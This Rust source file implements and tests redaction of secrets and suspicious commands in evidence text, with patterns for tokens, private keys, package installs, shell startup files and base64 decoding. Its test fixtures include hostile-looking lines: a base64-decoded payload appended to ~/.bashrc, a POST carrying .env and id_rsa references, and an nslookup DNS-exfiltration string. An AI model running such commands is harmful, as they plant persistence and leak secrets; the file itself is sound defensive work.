use std::sync::LazyLock;

use regex::Regex;

const MAX_REDACTED_EVIDENCE_CHARS: usize = 512;
const TRUNCATED_EVIDENCE_SUFFIX: &str = "[truncated]";

static PATH_REDACTION_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)([A-Z]:\\[^\s]+|\\\\[^\s]+|/home/\S+|/Users/\S+|/tmp/\S+|/var/\S+)")
        .expect("path redaction regex")
});

static SECRET_REDACTION_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b(token|key|secret|password|credential)\s*[:=]\s*\S+")
        .expect("secret redaction regex")
});

static PRIVATE_KEY_BOUNDARY_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)-{5}\s*(BEGIN|END)\s+((RSA|OPENSSH|EC|DSA)\s+)?PRIVATE\s+KEY\s*-{5}")
        .expect("private key boundary regex")
});

static PRIVATE_KEY_PHRASE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\b((RSA|OPENSSH|EC|DSA)\s+)?PRIVATE\s+KEY\b")
        .expect("private key phrase regex")
});

static PACKAGE_MANAGER_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)\b(npm|pnpm|yarn|bun|pip|pipx|uv|cargo|go|brew|apt|apt-get|dnf|yum)\b\s+(install|add|i|get|run|create|x)(\s+\S+)?",
    )
    .expect("package manager regex")
});

static STARTUP_TARGET_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(~/)?\.(bashrc|zshrc|profile|bash_profile)\b|config/fish/config\.fish|crontab")
        .expect("startup target regex")
});

static ENCODED_DECODER_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\bbase64\s+(-d|--decode)\b").expect("encoded decoder regex"));

static CREDENTIAL_GH_TOKEN_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\bgh[pousr]_[A-Za-z0-9_-]{16,}\b").expect("credential regex"));

static CREDENTIAL_SK_KEY_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\bsk-[A-Za-z0-9_-]{16,}\b").expect("credential regex"));

static CREDENTIAL_AKIA_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\bAKIA[0-9A-Z]{16}\b").expect("credential regex"));

static CREDENTIAL_XOX_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\bxox[baprs]-[A-Za-z0-9-]{20,}\b").expect("credential regex"));

static CREDENTIAL_JWT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b")
        .expect("credential regex")
});

static CREDENTIAL_BEARER_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\bBearer\s+[A-Za-z0-9._~+/=_-]{20,}\b").expect("credential regex")
});

static ENCODED_BLOB_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\b[A-Za-z0-9+/]{20,}={0,2}\b").expect("encoded blob regex"));

pub(crate) fn redact_error_message(msg: &str) -> String {
    let redacted = PATH_REDACTION_RE.replace_all(msg, "<path>").into_owned();
    let redacted = SECRET_REDACTION_RE
        .replace_all(&redacted, "[redacted-secret]")
        .into_owned();
    if redacted.len() > 200 {
        format!("{}...", &redacted[..197])
    } else {
        redacted
    }
}

pub fn redact_sensitive_text(text: &str) -> String {
    let mut excerpt = text
        .split_whitespace()
        .take(80)
        .collect::<Vec<_>>()
        .join(" ");
    excerpt = excerpt.replace(
        "https://darkroastcyber.io/mcp-lab",
        "https://darkroastcyber.io/[redacted]",
    );
    excerpt = excerpt.replace("darkroastcyber.io", "[controlled-domain]");
    excerpt = excerpt.replace(".env", "[sensitive-path]");
    excerpt = excerpt.replace("id_rsa", "[redacted-secret]");
    excerpt = excerpt.replace("id_ed25519", "[redacted-secret]");
    excerpt = excerpt.replace(".pem", "[redacted-secret]");
    excerpt = excerpt.replace("api key", "[redacted-secret]");
    excerpt = excerpt.replace("api token", "[redacted-secret]");
    excerpt = excerpt.replace("credential", "[redacted-secret]");
    excerpt = PRIVATE_KEY_BOUNDARY_RE
        .replace_all(&excerpt, "[redacted-secret]")
        .into_owned();
    excerpt = PRIVATE_KEY_PHRASE_RE
        .replace_all(&excerpt, "[redacted-secret]")
        .into_owned();
    excerpt = PACKAGE_MANAGER_RE
        .replace_all(&excerpt, "[package-manager-command]")
        .into_owned();
    excerpt = STARTUP_TARGET_RE
        .replace_all(&excerpt, "[startup-target]")
        .into_owned();
    excerpt = ENCODED_DECODER_RE
        .replace_all(&excerpt, "[encoded-decoder]")
        .into_owned();
    excerpt = CREDENTIAL_GH_TOKEN_RE
        .replace_all(&excerpt, "[redacted-secret]")
        .into_owned();
    excerpt = CREDENTIAL_SK_KEY_RE
        .replace_all(&excerpt, "[redacted-secret]")
        .into_owned();
    excerpt = CREDENTIAL_AKIA_RE
        .replace_all(&excerpt, "[redacted-secret]")
        .into_owned();
    excerpt = CREDENTIAL_XOX_RE
        .replace_all(&excerpt, "[redacted-secret]")
        .into_owned();
    excerpt = CREDENTIAL_JWT_RE
        .replace_all(&excerpt, "[redacted-secret]")
        .into_owned();
    excerpt = CREDENTIAL_BEARER_RE
        .replace_all(&excerpt, "[redacted-secret]")
        .into_owned();
    excerpt = ENCODED_BLOB_RE
        .replace_all(&excerpt, "[encoded-blob]")
        .into_owned();
    truncate_redacted_evidence(&excerpt)
}

fn truncate_redacted_evidence(excerpt: &str) -> String {
    if excerpt.chars().count() <= MAX_REDACTED_EVIDENCE_CHARS {
        return excerpt.to_string();
    }

    let keep_chars = MAX_REDACTED_EVIDENCE_CHARS.saturating_sub(TRUNCATED_EVIDENCE_SUFFIX.len());
    let truncated = excerpt.chars().take(keep_chars).collect::<String>();
    if keep_chars == 0 {
        TRUNCATED_EVIDENCE_SUFFIX.to_string()
    } else {
        format!("{truncated}{TRUNCATED_EVIDENCE_SUFFIX}")
    }
}

#[cfg(test)]
mod tests {
    use super::{redact_error_message, redact_sensitive_text};

    #[test]
    fn redact_sensitive_text_masks_controlled_domain_and_secret_markers() {
        let redacted = redact_sensitive_text(
            "POST https://darkroastcyber.io/mcp-lab with .env and id_rsa and sk-1234567890abcdef1234; pip install fixture && echo SGVsbG8= | base64 --decode >> ~/.bashrc",
        );

        assert!(!redacted.contains("darkroastcyber.io"));
        assert!(!redacted.contains(".env"));
        assert!(!redacted.contains("id_rsa"));
        assert!(!redacted.contains("sk-1234567890abcdef1234"));
        assert!(!redacted.contains("pip install"));
        assert!(!redacted.contains("base64 --decode"));
        assert!(!redacted.contains("~/.bashrc"));
        assert!(redacted.contains("[controlled-domain]"));
        assert!(redacted.contains("[sensitive-path]"));
        assert!(redacted.contains("[redacted-secret]"));
        assert!(redacted.contains("[package-manager-command]"));
        assert!(redacted.contains("[encoded-decoder]"));
        assert!(redacted.contains("[startup-target]"));
    }

    #[test]
    fn redact_sensitive_text_masks_encoded_blobs() {
        let redacted = redact_sensitive_text(
            "nslookup U1lOVEhFVElDX1BBWUxPQUQ=.example.invalid after encoding data",
        );

        assert!(!redacted.contains("U1lOVEhFVElDX1BBWUxPQUQ"));
        assert!(redacted.contains("[encoded-blob]"));
    }

    #[test]
    fn redact_sensitive_text_truncates_long_dense_evidence() {
        let redacted = redact_sensitive_text(&"normal-text-".repeat(80));

        assert_eq!(redacted.chars().count(), 512);
        assert!(redacted.ends_with("[truncated]"));
    }

    #[test]
    fn redact_sensitive_text_masks_rule_seeded_credential_patterns() {
        let redacted = redact_sensitive_text(
            "Seen AKIA1234567890ABCDEF, xoxb-1234567890abcdefABCDE, eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ.eyJzdWIiOiJhZHItZml4dHVyZSIsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c, and Bearer fixture_oauth_token_1234567890abcdef while checking fixture output.",
        );

        assert!(!redacted.contains("AKIA1234567890ABCDEF"));
        assert!(!redacted.contains("xoxb-1234567890abcdefABCDE"));
        assert!(!redacted.contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ"));
        assert!(!redacted.contains("fixture_oauth_token_1234567890abcdef"));
        assert!(redacted.contains("[redacted-secret]"));
    }

    #[test]
    fn redact_sensitive_text_masks_private_key_headers_case_insensitively() {
        let redacted = redact_sensitive_text(
            "Command output: -----BEGIN OpenSSH PRIVATE KEY----- synthetic-fixture-body -----END OpenSSH PRIVATE KEY-----",
        );

        assert!(!redacted.contains("BEGIN"));
        assert!(!redacted.contains("END"));
        assert!(!redacted.contains("PRIVATE KEY"));
        assert!(!redacted.contains("OpenSSH"));
        assert!(redacted.contains("[redacted-secret]"));
    }

    #[test]
    fn redact_error_message_strips_absolute_paths() {
        let redacted = redact_error_message(
            "io error: No such file or directory (os error 2) at /home/user/.local/share/opencode/opencode.db",
        );
        assert!(!redacted.contains("/home/user"));
        assert!(redacted.contains("<path>"));
    }

    #[test]
    fn redact_error_message_truncates_long_messages() {
        let long_msg = "x".repeat(300);
        let redacted = redact_error_message(&long_msg);
        assert!(redacted.len() <= 200);
        assert!(redacted.ends_with("..."));
    }

    #[test]
    fn redact_error_message_masks_secrets() {
        let redacted = redact_error_message("connection failed: token: abc123secret");
        assert!(!redacted.contains("abc123secret"));
        assert!(redacted.contains("[redacted-secret]"));
    }

    #[test]
    fn redact_error_message_strips_windows_paths() {
        let redacted = redact_error_message(
            r#"sqlite open failed at C:\Users\tester\AppData\Local\opencode\opencode.db"#,
        );
        assert!(!redacted.contains(r#"C:\Users\tester"#));
        assert!(redacted.contains("<path>"));
    }
}
